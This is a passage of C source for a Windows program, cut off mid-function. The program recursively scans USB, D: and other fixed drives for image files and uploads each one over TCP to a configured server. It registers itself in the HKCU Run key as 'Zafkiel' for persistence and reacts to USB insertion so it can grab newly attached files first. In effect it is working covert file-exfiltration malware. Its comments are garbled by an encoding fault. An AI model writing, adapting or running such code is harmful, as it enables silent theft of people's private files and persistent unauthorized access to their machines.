#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <dbt.h>
#include <io.h>
#include <direct.h>
#include <mstcpip.h>  // TCP KeepAlive ֧��

#pragma comment(lib, "ws2_32.lib")

// ======================== �궨��/���ó���===================

#define CONNECT_RETRY_INTERVAL  5000    // �������Լ�������룩
#define MAX_RETRIES             5       // ��������������Դ���
#define MAX_RETRY_QUEUE_SIZE    50      // ���Զ����������
#define SERVER_IP               "������IP��ַ��Server IP Address��"
#define SERVER_PORT             9000 //�������˿ڣ�server port��,����9000����Ҫ��֤�������˿ڿ���
#define BUFFER_SIZE             (4 * 1024 * 1024)   // 4MB ������
#define SIZE_30MB               (30 * 1024 * 1024)
#define MAX_PATH_LEN            4096    // ��·��֧��
#define MAX_RECURSION_DEPTH     64      // Ŀ¼�ݹ��������
#define INITIAL_RETRY_INTERVAL  1000    // ��ʼ���Լ�������룩
#define MAX_RETRY_INTERVAL      5000    // ������Լ��

// ======================== �ṹ���� ========================
typedef struct {
    char filepath[MAX_PATH_LEN];     // �ļ�����·��
    char filename[MAX_PATH];         // �ļ���
    unsigned long long size;         // �ļ���С��64λ��
    FILETIME lastWriteTime;
    BOOL isLargeFile;                // ����Ƿ�Ϊ���ļ�������30MB��
    BOOL isFromRemovable;            // ����Ƿ����Կ��ƶ��豸����U�̣�
} FileInfo;

// ����ṹ��
typedef struct TransmissionTask {
    volatile BOOL active;
    FileInfo info;
    int retryCount; // ��¼���Դ���
} TransmissionTask;

typedef struct {
    TransmissionTask* tasks;
    int front;
    int rear;
    int capacity;
} TaskQueue;

// ======================== ȫ��״̬�ṹ�� ========================
typedef struct {
    // �ļ��б����
    FileInfo* fileList;              // ��̬�ļ��б�����
    int fileCount;                   // ��ǰ�ļ�����
    int fileListCapacity;            // �ļ��б�����

    // �������豸֪ͨ
    HWND hwnd;
    HDEVNOTIFY hDeviceNotify;

    // �������
    volatile BOOL pauseTransmission; // ������ͣ��־
    CRITICAL_SECTION cs;             // �ٽ��������߳�ͬ��

    // �������
    TaskQueue taskQueue;

    // �����߳�
    HANDLE hThread;
    DWORD threadId;

    // ����������־
    volatile BOOL needRestart; // ����Ƿ���Ҫ����
    volatile LONG threadExitFlag; // ԭ���˳���־��LONG ���ͼ��� Interlocked ������
} State;

static State g_state = {0};// ȫ��״̬ʵ��


// ======================== ���ߺ��� ========================
unsigned long long htonll(unsigned long long value) {
    int num = 42;
    if (*(char *)&num == 42) {
        const unsigned int high = htonl((unsigned int)(value >> 32));
        const unsigned int low = htonl((unsigned int)(value & 0xFFFFFFFFLL));
        return (((unsigned long long)low) << 32) | high;
    }
    return value;
}

int SafeSend(SOCKET sock, const char* buf, int len) {
    int retries = MAX_RETRIES;
    int totalSent = 0;
    DWORD currentRetryInterval = INITIAL_RETRY_INTERVAL; // ��ǰ���Լ��

    while (totalSent < len && retries > 0) {
        // ����߳��˳���־
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[WARN] �����жϣ��߳��˳���־����λ\n");
            return -1;
        }

        int sent = send(sock, buf + totalSent, len - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            DWORD error = WSAGetLastError();
            if (error == WSAECONNRESET || error == WSAENOTCONN) {
                printf("[ERROR] �����ѶϿ�����������\n");
                return -1;
            }
            printf("[WARN] ���ʹ���: %lu��ʣ������: %d���´μ��: %lums\n",
                   error, retries - 1, currentRetryInterval);

            // �ȴ������¼��
            Sleep(currentRetryInterval);
            currentRetryInterval = min(currentRetryInterval + 1000, MAX_RETRY_INTERVAL);
            retries--;
        } else if (sent == 0) {
            printf("[WARN] �Զ˹ر�����\n");
            return -1;
        } else {
            totalSent += sent;
            retries = MAX_RETRIES;                    // �������Դ���
            currentRetryInterval = INITIAL_RETRY_INTERVAL; // ���ü��
        }
    }
    return (totalSent == len) ? totalSent : -1;
}

// ======================== ���ͳ�ʼ֪ͨ���� ========================
void SendInitialNotification() {
    SOCKET sock = INVALID_SOCKET;
    SOCKADDR_IN addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[INFO] ��ʼ��ʾ: ����socketʧ�� (%d)\n", WSAGetLastError());
        return;
    }

    // ���ö̳�ʱ�Ա�������
    DWORD timeout = 3000; // 3��
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("[INFO] ��ʼ��ʾ: ���ӷ�����ʧ�� (%d)\n", WSAGetLastError());
        closesocket(sock);
        return;
    }

    const char* message = "[INIT] Client connected";
    int len = (int)strlen(message);
    if (send(sock, message, len, 0) == SOCKET_ERROR) {
        printf("[INFO] ��ʼ��ʾ: ����ʧ�� (%d)\n", WSAGetLastError());
    } else {
        printf("[INFO] ��ʼ��ʾ: ��֪ͨ������\n");
    }

    closesocket(sock);
}

void SendFile(TransmissionTask* task) {
    const char* functionName = __func__;
    const char* file_path = task->info.filepath;
    const char* filename = task->info.filename;
    SOCKET hsock = INVALID_SOCKET;
    SOCKADDR_IN addr = {0};
    BOOL finalFailure = FALSE;
    char* buffer = NULL;
    FILE* fp = NULL;
    unsigned long long total_bytes = 0;

    // ======================== ��ʼ����������ַ ========================
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // ======================== ��̬����Ψһ�ļ������޸���ŵ������⣩ ========================
    static char** sentFilenames = NULL;    // ����Ψһ�ļ����������ظ���
    static int sentCount = 0;
    char uniqueName[MAX_PATH] = {0};
    strcpy(uniqueName, filename);

    // Ψһ�������߼�
    int attempt = 1;  // �����ʼֵ
    char tempName[MAX_PATH] = {0};

    // ѭ������Ψһ����ֱ���ҵ�һ��δʹ�õ�����
    while (1) {
        BOOL nameExists = FALSE;
        strcpy(tempName, filename);

        // �����ǰ��Ŵ���1���������ɴ���ŵ��ļ���
        if (attempt > 1) {
            char* dot = strrchr(tempName, '.');
            if (dot && (dot != tempName)) {  // ������չ��
                char ext[MAX_PATH] = {0};
                strcpy(ext, dot);
                snprintf(tempName, MAX_PATH, "%.*s (%d)%s",
                         (int)(dot - tempName),  // ���ļ�������
                         tempName,               // ԭ�ļ�����ʼλ��
                         attempt - 1,            // ��ǰ��ţ���1��ʼ��
                         ext);                   // ��չ��
            } else {                            // ����չ��
                snprintf(tempName, MAX_PATH, "%s (%d)", tempName, attempt - 1);
            }
        }

        // ��鵱ǰ���ɵ������Ƿ��Ѵ���
        for (int i = 0; i < sentCount; i++) {
            if (strcmp(sentFilenames[i], tempName) == 0) {
                nameExists = TRUE;
                break;
            }
        }

        if (!nameExists) {
            strcpy(uniqueName, tempName);  // �ҵ�Ψһ����
            break;
        }

        attempt++;
    }

    // ��¼���ļ�������̬���飨�洢Ψһ��������ԭʼ����
    char** newSent = realloc(sentFilenames, (sentCount + 1) * sizeof(char*));
    if (newSent) {
        sentFilenames = newSent;
        sentFilenames[sentCount] = _strdup(uniqueName);
        if (!sentFilenames[sentCount]) {
            printf("[WARN] �ڴ治�㣬ʹ��ԭ�ļ���: %s\n", filename);
            strcpy(uniqueName, filename);
        } else {
            sentCount++;
        }
    }


    // ======================== ���ӷ������������Ժ��˳���飬֧��KeepAlive�� ========================
    while (1) {
        // ����˳���־
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[WARN][%s] �˳��ź��ѽ��գ��������ӳ���\n", functionName);
            finalFailure = TRUE;
            goto cleanup;
        }

        hsock = socket(AF_INET, SOCK_STREAM, 0);
        if (hsock == INVALID_SOCKET) {
            printf("[ERROR][%s] �׽��ִ���ʧ��: %d\n", functionName, WSAGetLastError());
            Sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }

        // ���� KeepAlive
        struct tcp_keepalive alive = {1, 3000, 1000}; // ���ã�3���޻̽�⣬���1��
        DWORD bytesReturned;
        if (WSAIoctl(hsock, SIO_KEEPALIVE_VALS, &alive, sizeof(alive), NULL, 0, &bytesReturned, NULL, NULL) == SOCKET_ERROR) {
            printf("[WARN][%s] KeepAlive ����ʧ��: %d\n", functionName, WSAGetLastError());
        }

        // ��������
        if (connect(hsock, (SOCKADDR*)&addr, sizeof(addr)) == 0) {
            printf("[INFO][%s] �ɹ����ӷ�����\n", functionName);
            break;
        }

        // ����ʧ�ܴ���
        DWORD error = WSAGetLastError();
        printf("[WARN][%s] ����ʧ��: %lu��%d���������...\n", functionName, error, CONNECT_RETRY_INTERVAL);
        closesocket(hsock);
        hsock = INVALID_SOCKET;
        Sleep(CONNECT_RETRY_INTERVAL);
    }

    // ======================== ���ļ���֧�ֳ�·���� ========================
    char long_path[MAX_PATH_LEN];
    snprintf(long_path, sizeof(long_path), "\\\\?\\%s", file_path);
    fp = fopen(long_path, "rb");
    if (!fp) {
        printf("[ERROR][%s] �ļ���ʧ��: %s\n", functionName, long_path);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ======================== ��ȡ�ļ���С ========================
    _fseeki64(fp, 0, SEEK_END);
    long long actual_size = _ftelli64(fp);
    _fseeki64(fp, 0, SEEK_SET);
    if (actual_size == 0) {
        printf("[WARN][%s] ���ļ�: %s\n", functionName, uniqueName);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ======================== �����ļ�Ԫ���ݣ���С���ļ����� ========================
    unsigned long long net_file_size = htonll(actual_size);
    if (SafeSend(hsock, (char*)&net_file_size, sizeof(net_file_size)) != sizeof(net_file_size)) {
        printf("[ERROR][%s] �ļ���С����ʧ��\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ����Ψһ�ļ���
    unsigned int filename_len = (unsigned int)strlen(uniqueName);
    unsigned int net_filename_len = htonl(filename_len);
    if (SafeSend(hsock, (char*)&net_filename_len, sizeof(net_filename_len)) != sizeof(net_filename_len)) {
        printf("[ERROR][%s] �ļ������ȷ���ʧ��\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }
    if (SafeSend(hsock, uniqueName, filename_len) != filename_len) {
        printf("[ERROR][%s] �ļ�������ʧ��\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ======================== �����ļ����� ========================
    buffer = (char*)malloc(BUFFER_SIZE);
    if (!buffer) {
        printf("[ERROR][%s] ����������ʧ��\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }

    size_t bytes_read;
    // �ֿ��ȡ�ļ�������
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
        // ����˳���־
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[WARN][%s] �˳��ź��ѽ��գ���ֹ����: %s\n", functionName, uniqueName);
            finalFailure = TRUE;
            break;
        }

        // �������ݿ�
        int sent = SafeSend(hsock, buffer, (int)bytes_read);
        if (sent != (int)bytes_read) {
            printf("[ERROR][%s] ���ݷ���ʧ�� (�ѷ���: %d/%zu)\n", functionName, sent, bytes_read);
            finalFailure = TRUE;
            break;
        }
        total_bytes += sent;
        printf("[INFO][%s] ����: %s (%llu/%llu)\n", functionName, uniqueName, total_bytes, (unsigned long long)actual_size);
    }

    // ======================== �����Լ�� ========================
    if (total_bytes != (unsigned long long)actual_size && !finalFailure) {
        printf("[ERROR][%s] �ļ������� (ʵ��: %llu, Ԥ��: %llu)\n", functionName, total_bytes, (unsigned long long)actual_size);
        finalFailure = TRUE;
    }

    cleanup:
    // ======================== ��Դ���� ========================
    if (buffer) free(buffer);
    if (fp) fclose(fp);
    if (hsock != INVALID_SOCKET) {
        // ������ֹ��ǣ���ʹʧ��Ҳ���ԣ�
        if (!finalFailure && !InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            const char* endMsg = "[FIN] Transmission complete";
            send(hsock, endMsg, (int)strlen(endMsg), 0);
        }
        // ��ʽ�ر��׽���
        shutdown(hsock, SD_BOTH);  // �ر�˫��ͨ��
        closesocket(hsock);
        hsock = INVALID_SOCKET;
    }

    // ======================== �����߼����̰߳�ȫ�� ========================
    EnterCriticalSection(&g_state.cs);
    if (finalFailure) {
        if (task->retryCount < MAX_RETRIES) {
            TransmissionTask new_task = *task;
            new_task.retryCount++;
            // ���������������
            if (g_state.taskQueue.rear - g_state.taskQueue.front < MAX_RETRY_QUEUE_SIZE) {
                memmove(&g_state.taskQueue.tasks[g_state.taskQueue.front + 1],
                        &g_state.taskQueue.tasks[g_state.taskQueue.front],
                        (g_state.taskQueue.rear - g_state.taskQueue.front + 1) * sizeof(TransmissionTask));
                g_state.taskQueue.tasks[g_state.taskQueue.front] = new_task;
                g_state.taskQueue.rear++;
                printf("[RETRY][%s] �������: %s (����: %d)\n", functionName, uniqueName, new_task.retryCount);
            }
        } else {
            printf("[FATAL][%s] ��������: %s (����������Դ���)\n", functionName, uniqueName);
        }
    } else {
        printf("[SUCCESS][%s] �������: %s\n", functionName, uniqueName);
    }
    LeaveCriticalSection(&g_state.cs);
}

// ======================== �ݹ��ļ�ɨ�� ========================
BOOL IsRemovableByDeviceType(const char* root) {
    char physicalPath[MAX_PATH];
    snprintf(physicalPath, sizeof(physicalPath), "\\\\.\\%c:", root[0]);
    HANDLE hDevice = CreateFileA(physicalPath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

    STORAGE_PROPERTY_QUERY query = {0};
    query.PropertyId = StorageDeviceProperty;
    query.QueryType = PropertyStandardQuery;

    DWORD bytesReturned;
    BYTE buffer[1024] = {0};
    BOOL result = DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), buffer, sizeof(buffer), &bytesReturned, NULL);
    CloseHandle(hDevice);

    if (!result) return FALSE;
    STORAGE_DEVICE_DESCRIPTOR* desc = (STORAGE_DEVICE_DESCRIPTOR*)buffer;
    return (desc->BusType == BusTypeUsb);
}

void FindFile(const char* path, BOOL isRemovableDrive) {
    static int recursion_depth = 0;
    if (++recursion_depth > MAX_RECURSION_DEPTH) {
        printf("[WARN] Ŀ¼Ƕ�׹��������: %s\n", path);
        recursion_depth--;
        return;
    }

    if (strlen(path) >= MAX_PATH_LEN - 4) {
        printf("[WARN] ·������: %s\n", path);
        recursion_depth--;
        return;
    }

    char tempPath[MAX_PATH_LEN];
    snprintf(tempPath, sizeof(tempPath), "%s\\*.*", path);
    tempPath[MAX_PATH_LEN - 1] = '\0';

    WIN32_FIND_DATA fileData;
    HANDLE hfile = FindFirstFile(tempPath, &fileData);
    if (hfile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            printf("[WARN] ���ʱ��ܾ�: %s\n", path);
        } else {
            printf("[WARN] ��Ŀ¼ʧ��: %s (������: %lu)\n", path, error);
        }
        recursion_depth--;
        return;
    }

    do {
        if (fileData.cFileName[0] == '.') continue;

        snprintf(tempPath, sizeof(tempPath), "%s\\%s", path, fileData.cFileName);
        tempPath[MAX_PATH_LEN - 1] = '\0';

        if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            HANDLE hTest = CreateFile(tempPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
            if (hTest == INVALID_HANDLE_VALUE) {
                DWORD err = GetLastError();
                if (err == ERROR_ACCESS_DENIED) {
                    printf("[WARN] ��������Ŀ¼: %s\n", tempPath);
                    continue;
                }
            } else {
                CloseHandle(hTest);
            }
            FindFile(tempPath, isRemovableDrive);
        } else {
            char* ext = strrchr(fileData.cFileName, '.');
            //��Ҫ�����ȡ���ļ����ͣ�����Ϊʾ������������չ��The file types that you want to transfer and obtain are as follows, which can be extended by yourself��
            const char* allowed_ext[] = {
                    ".psd", ".bmp", ".jpg", ".jpeg", ".png"
            };

            if (ext) {
                int is_supported = 0;
                for (int i = 0; i < sizeof(allowed_ext)/sizeof(allowed_ext[0]); i++) {
                    if (_stricmp(ext, allowed_ext[i]) == 0) {
                        is_supported = 1;
                        break;
                    }
                }

                if (is_supported) {
                    if (fileData.dwFileAttributes & (FILE_ATTRIBUTE_DEVICE | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_REPARSE_POINT)) {
                        printf("[WARN] ���Էǳ����ļ�: %s\n", tempPath);
                        continue;
                    }

                    unsigned long long file_size = ((unsigned long long)fileData.nFileSizeHigh << 32) | fileData.nFileSizeLow;
                    if (file_size == 0) {
                        printf("[WARN] ���Կ��ļ�: %s (WIN32ԭ������)\n", tempPath);
                        continue;
                    }

                    EnterCriticalSection(&g_state.cs); // �����ٽ���

                    if (g_state.fileCount >= g_state.fileListCapacity) {
                        // ��̬��չ�ļ��б�����
                        int newCapacity = g_state.fileListCapacity == 0 ? 100 : g_state.fileListCapacity * 2;
                        FileInfo* newList = (FileInfo*)realloc(g_state.fileList, newCapacity * sizeof(FileInfo));
                        if (!newList) {
                            printf("[ERROR] �ļ��б���չʧ�ܣ�������ǰ�ļ�: %s\n", tempPath);
                            FindClose(hfile);
                            recursion_depth--;
                            LeaveCriticalSection(&g_state.cs);
                            continue; // ����������һ���ļ�
                        }
                        g_state.fileList = newList;
                        g_state.fileListCapacity = newCapacity;
                    }

                    // ����ļ���Ϣ
                    strncpy(g_state.fileList[g_state.fileCount].filepath, tempPath, MAX_PATH_LEN - 1);
                    g_state.fileList[g_state.fileCount].filepath[MAX_PATH_LEN - 1] = '\0';

                    strncpy(g_state.fileList[g_state.fileCount].filename, fileData.cFileName, MAX_PATH - 1);
                    g_state.fileList[g_state.fileCount].filename[MAX_PATH - 1] = '\0';

                    g_state.fileList[g_state.fileCount].size = file_size;
                    g_state.fileList[g_state.fileCount].lastWriteTime = fileData.ftLastWriteTime;
                    g_state.fileList[g_state.fileCount].isLargeFile = (file_size > SIZE_30MB);
                    g_state.fileList[g_state.fileCount].isFromRemovable = isRemovableDrive;

                    g_state.fileCount++; // �����ļ�����

                    LeaveCriticalSection(&g_state.cs); // �뿪�ٽ���
                }
            }
        }
    } while (FindNextFile(hfile, &fileData) != 0);

    FindClose(hfile);
    recursion_depth--;
}

// ======================== ������ɨ�� ========================
void ScanAllDrives() {
    DWORD driveMask = GetLogicalDrives();
    char driveRoot[] = "A:\\";
    char removableDrives[26][4] = {0};
    char fixedDrives[26][4] = {0};
    char dDrive[4] = "";
    int remCount = 0, fixedCount = 0;

    for (int drive = 'A'; drive <= 'Z'; drive++) {
        char driveChar = (char)drive;
        driveRoot[0] = driveChar;
        if (driveMask & (1 << (driveChar - 'A'))) {
            UINT type = GetDriveTypeA(driveRoot);
            BOOL isRemovable = IsRemovableByDeviceType(driveRoot);

            if (isRemovable || type == DRIVE_REMOVABLE) {
                strcpy(removableDrives[remCount++], driveRoot);

                // ========== �ؼ��޸�1������ע���豸֪ͨ ==========
                DEV_BROADCAST_DEVICEINTERFACE_A filter = {0};
                filter.dbcc_size = sizeof(filter);
                filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
                strncpy(filter.dbcc_name, driveRoot, sizeof(filter.dbcc_name)-1);

                HDEVNOTIFY hDevNotify = RegisterDeviceNotificationA(
                        g_state.hwnd,
                        &filter,
                        DEVICE_NOTIFY_WINDOW_HANDLE
                );
                if (hDevNotify) {
                    printf("[INFO] ��ע���豸֪ͨ: %s\n", driveRoot);
                }
            } else if (type == DRIVE_FIXED) {
                if (strcmp(driveRoot, "D:\\") == 0) {
                    strcpy(dDrive, driveRoot);
                } else {
                    strcpy(fixedDrives[fixedCount++], driveRoot);
                }
            }
        }
    }

    printf("\n=== ɨ�����ȼ���USB �� D�� �� �����̶��� ===\n");

    for (int i = 0; i < remCount; i++) {
        printf("[���ȼ�] ɨ��USB������: %s\n", removableDrives[i]);
        FindFile(removableDrives[i], TRUE);
    }

    if (strlen(dDrive) > 0) {
        printf("[���ȼ�] ɨ��D��: %s\n", dDrive);
        FindFile(dDrive, FALSE);
    }

    for (int i = 0; i < fixedCount; i++) {
        printf("[INFO] ɨ��̶���: %s\n", fixedDrives[i]);
        FindFile(fixedDrives[i], FALSE);
    }
}

// ======================== �������������� ========================
void AddToStartup() {
    HKEY hKey;
    char exePath[MAX_PATH];

    // ��ȡ��ǰexe·��
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        printf("[ERROR] ��ȡ����·��ʧ��: %lu\n", GetLastError());
        return;
    }

    // ��ע�����
    LSTATUS status = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_WRITE,
            &hKey
    );

    if (status != ERROR_SUCCESS) {
        printf("[ERROR] ��ע���ʧ��: %lu\n", status);
        return;
    }

    // ����ע���ֵ
    char quotedPath[MAX_PATH + 2];
    snprintf(quotedPath, sizeof(quotedPath), "\"%s\"", exePath);

    status = RegSetValueExA(
            hKey,
            "Zafkiel",
            0,
            REG_SZ,
            (const BYTE*)quotedPath,  // ʹ�ô����ŵ�·��
            (DWORD)strlen(quotedPath) + 1
    );

    RegCloseKey(hKey);

    if (status == ERROR_SUCCESS) {
        printf("[SUCCESS] ����������ע��ɹ���\n");
    } else {
        printf("[ERROR] ע���д��ʧ��: %lu\n", status);
    }
}

// ======================== ������в��� ========================
void InitQueue() {
    g_state.taskQueue.capacity = 100;
    g_state.taskQueue.tasks = malloc(g_state.taskQueue.capacity * sizeof(TransmissionTask));
    g_state.taskQueue.front = 0;
    g_state.taskQueue.rear = -1;
}


// ======================= ������ж�̬��չ =======================
void EnqueueTask(TransmissionTask task) {
    EnterCriticalSection(&g_state.cs);
    if (g_state.taskQueue.rear >= g_state.taskQueue.capacity - 1) {
        // ��̬��չ������������ȫ��飩
        int new_capacity = g_state.taskQueue.capacity * 2;
        TransmissionTask* new_tasks = realloc(g_state.taskQueue.tasks, new_capacity * sizeof(TransmissionTask));
        if (!new_tasks) {
            printf("[WARN][EnqueueTask] �����ڴ治�㣬�޷����������: %s\n", task.info.filename);
            LeaveCriticalSection(&g_state.cs);
            return;
        }
        g_state.taskQueue.tasks = new_tasks;
        g_state.taskQueue.capacity = new_capacity;
    }
    g_state.taskQueue.tasks[++g_state.taskQueue.rear] = task;
    LeaveCriticalSection(&g_state.cs);
}

// ======================== ������в��� ========================
TransmissionTask DequeueTask() {
    EnterCriticalSection(&g_state.cs);
    TransmissionTask task = {0};
    while (g_state.taskQueue.front <= g_state.taskQueue.rear) {
        task = g_state.taskQueue.tasks[g_state.taskQueue.front++];
        if (task.active) break; // ֻ���ػ�Ծ����
    }
    LeaveCriticalSection(&g_state.cs);
    return task;
}

int IsQueueEmpty() {
    EnterCriticalSection(&g_state.cs);
    int empty = (g_state.taskQueue.front > g_state.taskQueue.rear);
    LeaveCriticalSection(&g_state.cs);
    return empty;
}

// ======================== �豸֪ͨ���̹߳��� ========================
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_DEVICECHANGE: {
            PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
            if (wParam == DBT_DEVICEARRIVAL && pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                printf("\n[�¼�] ��⵽U�̲��룬��ͣ��ǰ���䲢���ȴ������ļ�...\n");
                EnterCriticalSection(&g_state.cs);
                g_state.pauseTransmission = TRUE;
                LeaveCriticalSection(&g_state.cs);
                Sleep(500); // �ȴ���ǰ�������

                EnterCriticalSection(&g_state.cs);
                int prevFileCount = g_state.fileCount;
                LeaveCriticalSection(&g_state.cs);

                ScanAllDrives();

                EnterCriticalSection(&g_state.cs);
                if (g_state.fileCount > prevFileCount) {
                    int newTaskCount = g_state.fileCount - prevFileCount;
                    TransmissionTask* temp = malloc(
                            (g_state.taskQueue.rear - g_state.taskQueue.front + 1 + newTaskCount) * sizeof(TransmissionTask)
                    );

                    if (!temp) {
                        printf("[WARN] �ڴ治�㣬�޷����ȴ����²����ļ�\n");
                        LeaveCriticalSection(&g_state.cs);
                        break;
                    }

                    for (int i = prevFileCount; i < g_state.fileCount; i++) {
                        TransmissionTask task = {
                                .active = TRUE,
                                .info = g_state.fileList[i],
                                .retryCount = 0
                        };
                        temp[i - prevFileCount] = task;
                    }

                    for (int i = 0; i <= g_state.taskQueue.rear - g_state.taskQueue.front; i++) {
                        temp[newTaskCount + i] = g_state.taskQueue.tasks[g_state.taskQueue.front + i];
                    }

                    free(g_state.taskQueue.tasks);
                    g_state.taskQueue.tasks = temp;
                    g_state.taskQueue.front = 0;
                    g_state.taskQueue.rear = newTaskCount + (g_state.taskQueue.rear - g_state.taskQueue.front);
                    g_state.taskQueue.capacity = newTaskCount + (g_state.taskQueue.rear - g_state.taskQueue.front + 1);
                }

                g_state.pauseTransmission = FALSE;
                LeaveCriticalSection(&g_state.cs);
            }

            // ========== �豸�Ƴ�ʱ������� ==========
            if (wParam == DBT_DEVICEQUERYREMOVE || wParam == DBT_DEVICEREMOVEPENDING) {
                if (pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                    PDEV_BROADCAST_VOLUME pVol = (PDEV_BROADCAST_VOLUME)pHdr;
                    DWORD driveMask = pVol->dbcv_unitmask;
                    char driveLetter = 'A';
                    for (; driveMask; driveMask >>= 1, driveLetter++) {
                        if (driveMask & 1) break;
                    }
                    char driveRoot[4] = {driveLetter, ':', '\\', '\0'};
                    printf("\n[�¼�] ��⵽�豸 %s �����Ƴ���ǿ�����������Դ...\n", driveRoot);

                    EnterCriticalSection(&g_state.cs);
                    // �����������
                    int validTasks = 0;
                    for (int i = g_state.taskQueue.front; i <= g_state.taskQueue.rear; i++) {
                        if (strncmp(g_state.taskQueue.tasks[i].info.filepath, driveRoot, 3) != 0) {
                            g_state.taskQueue.tasks[validTasks++] = g_state.taskQueue.tasks[i];
                        } else {
                            printf("[ǿ������] �Ƴ�����: %s\n", g_state.taskQueue.tasks[i].info.filename);
                            // �������Ϊ��Ч
                            g_state.taskQueue.tasks[i].active = FALSE;
                        }
                    }
                    g_state.taskQueue.rear = validTasks - 1;
                    g_state.taskQueue.front = 0;

                    // ����������־
                    g_state.needRestart = TRUE;
                    LeaveCriticalSection(&g_state.cs);
                    printf("[�¼�] �ѱ��������־���ȴ����̴߳���...\n");
                }
                return TRUE; // ����ϵͳ�Ƴ��豸
            }
            break;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

void RegisterDeviceNotify() {
    DEV_BROADCAST_DEVICEINTERFACE_A filter = {0};
    filter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE_A);
    filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;

    g_state.hDeviceNotify = RegisterDeviceNotificationA(
            g_state.hwnd,
            &filter,
            DEVICE_NOTIFY_WINDOW_HANDLE | DEVICE_NOTIFY_ALL_INTERFACE_CLASSES
    );
}

// ======================== �����߳� ========================
DWORD WINAPI TransmissionThread(LPVOID lpParam) {
    while (1) {
        // ========== ��ѭ����ڼ���˳���־ ==========
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[INFO] �����߳����յ��˳��źţ������˳�...\n");
            break;
        }

        // ========== ����Ƿ���ͣ���� ==========
        EnterCriticalSection(&g_state.cs);
        BOOL isPaused = g_state.pauseTransmission;
        LeaveCriticalSection(&g_state.cs);

        if (isPaused) {
            // ��ʱ���߲�Ƶ������˳���־
            for (int i = 0; i < 10; i++) {
                if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
                    break; // �����˳�
                }
                Sleep(100);
            }
            continue;
        }

        // ========== �Ӷ����л�ȡ���� ==========
        TransmissionTask task = DequeueTask();

        // ========== ��������ǰ�ٴμ���˳���־ ==========
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[INFO] �˳��ź��ѽ��գ���������������\n");
            break;
        }

        if (task.active) {
            SendFile(&task); // �����ļ����ڲ������˳���־��
        } else {
            // ����Ϊ��ʱ��ʱ���߲�����˳���־
            for (int i = 0; i < 10; i++) {
                if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
                    break; // �����˳�
                }
                Sleep(100);
            }
        }
    }
    return 0;
}

// ======================== �������� ========================
void SafeRestart() {
    // ================= ֹͣ�����߳� =================
    // ����ԭ���˳���־��������
    InterlockedExchange(&g_state.threadExitFlag, TRUE);
    printf("[INFO] ���������߳��˳����ȴ�����...\n");

    // �ȴ��߳��˳������ 5 �룩
    DWORD waitResult = WaitForSingleObject(g_state.hThread, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        // ǿ����ֹ�̣߳�����ֶΣ�
        TerminateThread(g_state.hThread, 0);
        printf("[WARN] �����߳�δ��Ӧ����ǿ����ֹ��\n");
    }

    // �����߳̾��
    CloseHandle(g_state.hThread);
    g_state.hThread = NULL;

    // ================= ����ȫ����Դ =================
    EnterCriticalSection(&g_state.cs);
    // �����ļ��б�
    free(g_state.fileList);
    g_state.fileList = NULL;
    g_state.fileCount = 0;
    g_state.fileListCapacity = 0;

    // �����������
    free(g_state.taskQueue.tasks);
    g_state.taskQueue.tasks = NULL;
    g_state.taskQueue.front = 0;
    g_state.taskQueue.rear = -1;
    LeaveCriticalSection(&g_state.cs);

    // ================= ���³�ʼ�� =================
